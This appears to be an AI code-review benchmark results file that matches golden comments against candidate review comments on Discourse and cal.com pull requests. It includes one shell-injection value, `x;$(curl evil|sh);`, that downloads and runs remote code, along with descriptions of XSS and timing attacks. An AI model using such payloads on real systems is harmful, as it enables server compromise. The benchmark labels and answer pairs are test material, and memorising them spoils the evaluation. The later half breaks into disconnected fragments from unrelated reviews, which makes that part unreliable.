The candidate pinpoints the totalPages formula as the cause, but the underlying issue and UX symptom match the golden comment.

false_positives.candidate:
remove_member uses group.users.delete, skipping GroupUser destroy callbacks

`group.users.delete(user_id)` on a has_many :through deletes the GroupUser join row with a raw `delete_all`, so GroupUser `after_destroy` callbacks do not run. In Discourse those callbacks (`remove_primary_group`, `remove_title`) clear the user's `primary_group_id` and group-derived title. After removal through this endpoint, the user can still have the removed group as their primary group and keep its title, leaving stale data.

The previous code called `group.remove(user)`, which destroys the GroupUser records and fires the callbacks. Use that here instead. The trailing `group.save` also does nothing, because the delete has already been persisted.

Adding a username that is already a member raises and 500s, leaving a partial add

`group.add(user)` is `users.push(user)`, which immediately inserts a GroupUser row, and nothing checks for existing membership first. If the admin enters a username that is already in the group, the unique (group_id, user_id) constraint raises `RecordNotUnique` and the request returns a 500.

Usernames processed before the duplicate have already been committed, so the add is partial. On the client, `Group#addMembers` has no error handler, so the admin gets no feedback and the list is not refreshed.

The old UI sent the full usernames list through `usernames=`, which diffed membership, so this case did not arise. Skip users who are already members, e.g. `group.add(user) unless group.users.include?(user)`.

Removed PATCH/nested-param API now silently resets visibility for existing callers

The incremental `PATCH /admin/groups/:id` with `changes: {add:, delete:}` and the nested `group: {...}` params for PUT and POST have been removed, but the routes still accept these requests.

A PATCH from an existing API client now reaches `update`, which does no membership change. Because `params[:visible]` is absent, `group.visible = params[:visible] == "true"` sets the group to invisible and returns success. Clients still sending `group[visible]`/`group[name]` to PUT get the same silent visibility reset.

POST `/admin/groups` with `group[name]` now creates nothing and returns a validation error, because `params[:name]` is nil.

Either keep backward compatibility for these callers, or only assign `visible` when the parameter is present.

Public group members page now shows only the first 50 members with no pagination

`GroupsController#members` now always applies `limit` (default 50), and `findMembers` requests only the first page. The public `group/members.hbs` template iterates `members` but has no next/previous controls, unlike the admin template. Previously non-automatic groups returned all members. Any group with more than 50 members now silently shows a truncated list on the public group page, and users have no way to see the rest.

Public /groups/:name/members.json response shape changed from array to object

The endpoint previously returned a JSON array of users. It now returns `{members: [...], meta: {...}}`. Any external API consumer, or other client code still treating the response as an array, will break. No spec was added or updated in `spec/controllers/groups_controller_spec.rb` to cover the new shape or the pagination meta.

members limit/offset are unvalidated (no cap, negatives cause 500)

`limit` and `offset` are taken directly from params. Anyone who can see a group can pass a very large `limit` (e.g. on trust_level_0 or everyone-sized groups) and force serialization of every member in one request. A negative `limit` or `offset` makes PostgreSQL raise and the request returns a 500. A `limit` of 0 is echoed back in `meta.limit` and causes a division by zero in the client pager. Clamp `limit` to a sane range (e.g. 1..200) and `offset` to at least 0.

remove_member spec uses PUT although the route is DELETE

The test "cannot remove members from automatic groups" issues `xhr :put, :remove_member`, but `config/routes.rb` maps `remove_member` only to `DELETE members`. Controller specs dispatch straight to the action without checking the HTTP verb, so the test passes while exercising a request shape the app never routes. Use `:delete` to match the real route.

addMembers/removeMember have no failure handling

Both `addMembers` and `removeMember` only chain a success callback. The controller actions only chain onto these promises (for `addMembers` the promise is not even returned). When the server responds with an error, the UI shows nothing to the admin: for example, the 422 for automatic groups, or a 500 on duplicate member insert. The failure is silent and the admin cannot tell whether the change was applied. The input is also never cleared after a successful add, as the TODO acknowledges.

false_negatives.golden_comment: The findMembers() call is now asynchronous and unhandled. The controller may not have member data immediately available, creating a race condition.
The remove_member test uses xhr :put to call the remove_member action, but the route defines delete 'members' => 'groups#remove_member' requiring DELETE method.
Expected to return a value at the end of function - code paths without explicit returns will return undefined

The route provides the group's ID in params[:id], but the code attempts to read it from params[:group_id], causing the action to fail. This results in a broken feature when trying to access group memberships.

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Validation runs twice per signup, double-counting BlockedEmail matches

`create` calls `user.valid?` (when `call_discourse_hub` is on) and then `user.save`, which validates again. Validation now has a side effect: `BlockedEmail.should_block?` increments `match_count` and saves. A matching `do_nothing` entry, whose save succeeds and is not rolled back, is therefore counted twice per signup attempt. Any other code path that calls `valid?` before `save` inflates the counter the same way. Keeping side effects out of validators avoids this.
true_positives.reasoning: Both identify the same core bug: BlockedEmail/BlockedEmail.should_block? performs a write (incrementing match_count) as a side effect of a read/validation check. The candidate focuses on the concrete consequence (double-counting when valid? and save both run), which is a manifestation of the side effect the golden comment describes.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Blocked-email lookup is case-sensitive and unnormalized, so the block is easy to bypass

`BlockedEmail.where(email: email)` does an exact, case-sensitive match on whatever the user typed. Neither the stored value nor the input is downcased or stripped. If `block@spamfromhome.org` is blocked, a spammer can register as `Block@SpamFromHome.org` or with surrounding whitespace and pass validation. Normalize both sides, for example with `Email.downcase(...).strip` on save and on lookup, or compare with `lower(email)`.
true_positives.reasoning: Both identify the same core bug: blocked-email checks use exact case-sensitive matching, so differently capitalized variants of a blocked address can bypass the block. The candidate adds whitespace normalization, but that does not change the underlying issue.

false_positives.candidate:
Match statistics write is rolled back for blocked emails when it runs inside User#save

`should_block?` updates and saves `match_count` and `last_match_at` while the User model is validating. `User#save` runs validations inside its own transaction. When the email is blocked, validation fails, `save` returns false, and Rails raises `ActiveRecord::Rollback`, which also rolls back the BlockedEmail update. As a result, blocked attempts that go through `user.save` alone (e.g. when `call_discourse_hub` is off) are never recorded. Those are exactly the hits the statistics are meant to capture. Only the separate `user.valid?` call in the controller, which runs outside a transaction, persists the count. The specs miss this because they call `should_block?` directly. Recording the match outside the validation transaction, or not in a validator at all, would fix it.

Non-atomic read-modify-write increment of match_count

`record.match_count += 1; record.save` reads the row, increments it in Ruby, and writes it back. Concurrent signup attempts with the same email can each read the same value, and the later write overwrites the earlier one, losing increments. Each save also runs the uniqueness validation query. An atomic `BlockedEmail.where(id: record.id).update_all(['match_count = match_count + 1, last_match_at = ?', Time.zone.now])` avoids both problems.

Any server-side email rejection is shown inline as 'invalid email'

The client adds the email to `rejectedEmails` whenever `result.errors.email` is present. That includes 'has already been taken', the domain whitelist/blacklist message, and 'is not allowed'. The inline reason is then always `I18n.t('user.email.invalid')`. A user whose correctly formatted address is already registered sees a 'please enter a valid email' hint that contradicts the flash error. The message should reflect the server's actual error, e.g. using `result.errors.email`.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

true_positives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
true_positives.matched_candidate:
Header right-alignment depends on modern-only flex behavior while float fallbacks were removed

The `float: right` on `.panel` and `float: left` on `.title` were removed. Right-alignment of the panel now depends solely on `margin-left: auto` inside a flex container.

The new `flexbox()` mixin emits `display: -webkit-box` / `-moz-box` for old engines. In the 2009 box model, auto margins do not absorb free space (alignment is done with `box-pack`), and children's floats are ignored.

The result is that browsers matched only by the legacy prefixes render the panel immediately after the logo instead of at the right edge. The vendor prefixes therefore give a false sense of legacy support. Either drop the legacy `display` values or add the matching `-webkit-box-pack`/`-moz-box-pack` handling.
true_positives.reasoning: Both comments identify the same regression: removing the float-based header alignment leaves right alignment dependent on flexbox behavior, so the panel no longer stays right-aligned in contexts where that behavior is unavailable. The candidate emphasizes legacy prefixed flex engines, while the golden comment emphasizes the non-flex noscript header, but the underlying code issue is the same.

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
align-items() emits invalid legacy values for flex-start/flex-end and a non-existent property

`-webkit-box-align` and IE10's `-ms-flex-align` expect `start`/`end`, not `flex-start`/`flex-end`. Calling `@include align-items(flex-start)` therefore produces invalid declarations for exactly the legacy engines the mixin exists to support.

Separately, `-ms-align-items` (line 121) is not a real property in any IE/Edge version and is dead output.

Only `center` and `baseline` are used today, so this is latent. Fix: map the values for the legacy prefixes and drop `-ms-align-items`.
true_positives.reasoning: The candidate explicitly identifies that -ms-align-items is not a real IE/Edge property and should be dropped, matching the golden comment's core issue. It also mentions the correct legacy property, -ms-flex-align.

true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order() passes the value unchanged to the 1-based legacy box-ordinal-group

The 2009 box spec's `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` only accept positive integers and default to 1. Modern `order` defaults to 0 and accepts 0 and negative values.

Passing `$val` straight through has two effects:
- `order(0)` or a negative value produces an invalid declaration in legacy engines, which is dropped.
- `order(1)` ties with un-ordered siblings in legacy engines but sorts after them in modern ones.

The current callers (2 and 3) happen to keep the same relative order. The mixin is now a shared helper, though, so the next caller can silently get different ordering per engine. Emit `$val + 1` for the legacy properties, as Bourbon/Compass do.
true_positives.reasoning: Both comments identify the same bug: legacy -webkit/-moz box-ordinal-group properties are 1-based, so passing an order value of 0 (or negative) unchanged produces invalid/incorrect legacy rendering. The candidate adds detail about ordering differences but points to the same fix of offsetting by 1.

false_positives.candidate:
Small-action edit/delete buttons no longer reach the right edge

`.small-action` is now a flex container, but `.small-action-desc` has no `flex-grow` (no `flex: 1`). It used to be a block that spanned the full row. Now it only takes its content width.

The edit/delete buttons inside it rely on `button { float: right; }` (line 309). They therefore float to the right edge of a narrow box, not the right edge of the post. For short actions such as "closed 2 days ago", the buttons end up right next to the text. With a long custom message they sit at the far right, so the position is inconsistent.

Any `button` that is a direct child of `.small-action` has its `float` ignored entirely, since floats don't apply to flex items.

Fix: add `flex: 1 1 auto` (and likely `min-width: 0`) to `.small-action-desc`.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name is missing the trailing `?` and is never called

ActiveModel::Serializers looks for `include_<attr>?` to decide whether to emit an attribute. The method here is named `include_website_name`, without the `?`, so the serializer never calls it.

As a result `website_name` is always emitted, as `nil` when no website is set. The intended conditional inclusion never takes effect.

This also suggests the author expected this method to gate the attribute; it does not, which contributes to the untrusted-attribute leak above. It should be renamed `include_website_name?` and should also respect `restrict_user_fields?`.
true_positives.reasoning: Both identify the same core bug: include_website_name lacks the required trailing ?, so the serializer does not use it for conditional attribute inclusion. The candidate omits the secondary string-concatenation concern, but the primary issue matches.

false_positives.candidate:
website_name bypasses untrusted_attributes, exposing TL0 users' websites to anonymous viewers

`website` is listed in `untrusted_attributes`, so it is omitted when `scope.restrict_user_fields?(object)` is true (a TL0 user viewed by an anonymous visitor). This anti-spam control exists to keep new users' links off public pages.

The new `website_name` attribute carries the website's host and often its full path, but it is not added to `untrusted_attributes` and has no equivalent guard. It is therefore always serialized.

Before this change, the client derived the display name from `model.website`, which was absent in this case, so nothing was shown. Now `user.hbs` checks `model.website_name` and renders it (as a span, because `linkWebsite` is false for TL0). Spam profiles' domains are again shown to anonymous users and crawlers.

Fix: add `:website_name` to `untrusted_attributes`, or have its include method return false when `scope.restrict_user_fields?(object)`.

Sibling-subdomain heuristic treats unrelated domains under a shared public suffix as the same site

When both hosts have the same number of labels and more than two, the code drops the first label of each and compares the rest. It ignores public suffixes.

For example, with the forum at `forum.co.uk`, a user website `evil.co.uk/whatever` matches on `co.uk`. Likewise `alice.github.io` vs `forum.github.io` matches on `github.io`.

In these cases unrelated third-party sites are shown with their full path, which is the opposite of what the feature intends. The comparison is also case-sensitive, so `Example.com` would not match `example.com`.

Nokogiri then re-serializes the broken markup into a real `onmouseover` attribute. Result: an unauthenticated visitor with a spoofed Referer can plant script in a forum topic. Any later edit through the normal edit UI/API therefore stores arbitrary unsanitized HTML, `<script>` included, in `cooked`. Every request to `/embed/best` for an unknown `embed_url` enqueues a `RetrieveTopic` job, and `loading.html.erb` reloads every 30s, so each viewer enqueues another job each time. The only gate is the Referer header, which non-browser clients can trivially set.

The throttle in TopicRetriever is keyed on the exact URL string. An attacker can vary the query string (`?a=1`, `?a=2`, …) on any real page of the embeddable host. Each variant triggers a synchronous full `PollFeed` run plus an HTTP fetch, and if the host returns 200, a brand new topic.

The next import of that URL with changed content calls `PostRevisor.new(nil).revise!`, which raises NoMethodError. In `PollFeed` this also aborts processing of all subsequent items.

In addition, `EmbedController` keeps finding the stale `topic_id` and `TopicView` raises NotFound, so the embed shows an error forever instead of recreating or hiding the discussion. Handle a missing post/topic (skip it, or remove/recreate the embed).

Check-then-create race on embed_url; side effects fire for rolled-back topics

`import` looks up `TopicEmbed.where(embed_url: url).first` and creates if absent, with no lock. Two runs for the same URL can both see nothing:
- the scheduled PollFeed racing a RetrieveTopic, which itself runs PollFeed synchronously;
- two un-throttled staff retrievals.

In that case the second `TopicEmbed.create!` hits the unique index and raises, rolling back the outer `Topic.transaction`.

However, PostCreator runs `enqueue_jobs`, `MessageBus.publish` and `TopicTrackingState.publish_new` before that outer transaction commits. Clients are notified of, and Sidekiq jobs target, a topic and post that never existed.

Also, `ActiveRecord::Rollback` raised inside PostCreator's nested `Post.transaction` is swallowed when nested like this. For example, a host-spam rejection then surfaces only as a later NOT NULL violation on `post_id`.

- Topics no longer get `created_at` from the Disqus thread, so imported topics are dated at import time.
- Every thread now requires an HTTP fetch of `t[:link]` via `import_remote`. Any fetch error (404, timeout, DNS) raises and aborts the whole import with no per-thread recovery.

Also, links that are not `https?://` cause `import` to return nil after the fetch, so those threads and their comments are skipped silently.

The `Tempfile` object keeps its open descriptor on the old inode, so `Tempfile#size` (fstat on that fd) can report the pre-optimization size. The stale size has two effects:
- It drives the loop condition, which can trigger extra unnecessary downsizes.
- It is passed as `filesize` to `Upload.create_for`, which can store a wrong size or reject an image that now fits.

A `type` such as `x;$(curl evil|sh);` therefore executes arbitrary shell commands on the server. The attacker only needs an API key and a URL pointing to a large `.png`.

Fix both sides:
- Whitelist `type`.
- Build the command without the shell (`Open3`/`system` with an argv array, or `Shellwords.escape` on each element).

`FileHelper.is_image?` accepts `.svg`, so an SVG larger than `max_image_size_kb` is fed to `convert ... -resize 80%> file.svg`. That rasterizes the vector image and writes it back to the `.svg` path, either failing or producing a bloated or corrupted file.

- A small compressed image with huge pixel dimensions (decompression bomb) can use a lot of memory and CPU in each pass.
- The work runs either in the request thread (synchronous API) or in `Scheduler::Defer`, a single in-process queue, so a few large uploads stall all other deferred work in that process.

Repeated 80% lossy re-encodes also degrade JPEG quality cumulatively.

Enforce a server-side byte and pixel limit before converting. Compute the needed scale once (one pass), and consider moving the work to a background job.

The PR changes the `optimize`/`downsize` signatures and adds a downsizing loop in `UploadsController#create_upload`, but adds no specs. A spec calling `OptimizedImage.downsize` with width and height would have caught the method-override bug immediately.

Add coverage for:
- Both `downsize` call forms.
- The controller loop: oversized image is reduced, conversion failure, animated GIF, SVG.

- `notifications_changed_at` is not updated.

It can only resolve through the dev-only `globalThis.prisma` cache, which is typed `PrismaClient | undefined` and is not set in production. In production `getClient` throws a ReferenceError, so the Salesforce integration fails for every operation.

Success check relies on `statusText === "OK"`

`statusText` is an empty string for HTTP/2 responses and can differ between proxies and runtimes. In those cases a successful 200 response is treated as an error and throws `HttpError` with an empty message. Use `response.ok` instead.

The Zoom app's slug/appId is "zoom", which is what `createOAuthAppCredential` uses and what the webhook matches against `prisma.app.slug`. The refresh call sends `appSlug=zoomvideo`, the directory name. A self-hoster implementing the sync endpoint therefore sees a slug that doesn't match the one they must send to `/api/webhook/app-credential`.

The secret header is checked with a plain string inequality. That leaks timing information an attacker can use to guess the secret, and this endpoint can write arbitrary credentials for any user. Use `crypto.timingSafeEqual` on equal-length buffers. The handler also accepts any HTTP method; restrict it to POST.

Adapters such as Google, Zoom and Webex mark credentials `invalid: true` on `invalid_grant`. When the parent app pushes fresh keys through this webhook, only `key` is updated, so the credential stays flagged invalid even though it now holds valid tokens. Set `invalid: false` on update.

Simple tests would have caught several of the bugs above: the `[object Object]` schema key, the safeParse wrapper being persisted as Google's key, and the Response shape mismatch in sync mode.

`createEvent` and `createAttendees` always use the first destination calendar's externalId. When `EventManager` creates the event for a second collective host with their Lark credential, the main host's calendar id is used with the wrong account, so creation fails. The same applies to `createAttendees` at line 164. Select the destination matching the current credential.

Recurring cancellation runs once per reference and still deletes only one host's events

The recurring-series deletion block is now inside `for (const reference of bookingCalendarReference)`. For a collective booking with N calendar references, it iterates all organizer calendar credentials over all `updatedBookings` N times, causing duplicate delete calls. Each pass still uses `updBooking.references.find(...)` (the first calendar reference only) and only the organizer's credentials. The other hosts' recurring events are therefore never deleted from their calendars. Move the recurring logic out of the loop and iterate every calendar reference, using each reference's own credential.

Only the first old calendar event is deleted when merging bookings

When `newBookingId` is given, the code does `booking.references.find(...)` and deletes a single calendar event. With multiple per-host calendar references now possible, the other hosts' old events are left behind as orphaned duplicates in their calendars.

Each collective host gets a separate Google Meet conference

Each host's Google calendar now receives its own `events.insert` with `conferenceData.createRequest` and `conferenceDataVersion: 1`. Google creates a new Meet conference for every inserted event, so hosts on different Google accounts see different Meet links in their calendars. Attendees receive only one link through cal.com emails, so participants can join different meetings. Only the main host's event should create the conference, and the others should reuse its link.

Webhook payload shape of destinationCalendar changes from object to array

`CalendarEvent` objects are spread directly into webhook payloads (cancel, reject, reschedule-request, etc.). Changing `destinationCalendar` from an object to an array is a breaking change for external webhook consumers such as Zapier and custom integrations, which read `payload.destinationCalendar.externalId`. The value is also now inconsistent: `null` for BOOKING_CREATED/REQUESTED and `[]` for BOOKING_REJECTED, as the e2e test shows. Consider keeping the external payload shape stable, or document and version the change.

No tests for multi-host destination calendar behavior

The PR reworks event creation, update and cancellation for multiple calendar references, adds DB credential lookups, and changes the `Calendar.createEvent` signature. The only test change is updating one webhook expectation to `[]`. Nothing covers the collective multi-host path or the regressions above, such as the Meet-without-destination crash or missing video credentialId. Unit tests for `EventManager.createAllCalendarEvents`/`updateAllCalendarEvents` and the cancel flow with multiple references are needed.

false_positives.candidate:
import() calls run eagerly at module load, so nothing is lazy-loaded

Each property value is `import("./xxx")`, and these calls run as soon as `packages/app-store/index.ts` is evaluated. Any route that pulls in `@calcom/app-store` therefore still starts loading all 28 app packages on cold start. Such routes include anything going through `videoClient`, `getCalendar`, `handlePayment`, `deletePayment` or `handleCancelBooking`.

The PR's goal of async, on-demand loading of apps is not achieved. Instead of reducing work, the change adds `await` overhead to every lookup.

There is a second effect. If an app module fails to load and nobody happens to await that specific entry yet, the rejection is an unhandled promise rejection at startup. On Node 15+ that can terminate the process.

Fix: store thunks, e.g. `applecalendar: () => import("./applecalendar")`, and call them at the lookup site, e.g. `await appStore[key]?.()`. Callers would need to handle missing keys.

requestReschedule: async forEach swallows getCalendar failures into unhandled rejections

`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); return calendar?.deleteEvent(...) })` discards every callback promise.

Before this PR, a synchronous failure in `getCalendar` (e.g. a CalendarService constructor throwing on a bad credential) failed the tRPC mutation with an error. Now it is an unobserved promise rejection: the mutation reports success, and the process gets an unhandled rejection.

The calendar and video deletions are also not awaited before the mutation sends emails and webhooks and returns. In serverless execution they may never complete.

Fix: use `await Promise.all(bookingRefsFiltered.map(async ...))`, or `allSettled` with logging if failures should not block the reschedule.

getCalendarCredentials creates calendar promises that are discarded for non-'calendar' variants

`getCalendar(credential)` now returns a Promise. It is still invoked for every credential of every `_calendar` app, before the `app.variant === "calendar"` check. For apps whose variant is not "calendar" (e.g. `*_other_calendar` CRMs), the promise is created and thrown away. If it rejects (e.g. the service constructor throws on the stored key), nobody handles it and it becomes an unhandled promise rejection.

The exported return shape also changed: `calendar` is now a `Promise<Calendar | null>` instead of a `Calendar | null`. Any consumer other than `getConnectedCalendars` that uses `item.calendar` directly will silently break.

Fix: only call `getCalendar` inside the `variant === "calendar"` branch, or resolve it lazily inside `getConnectedCalendars`.
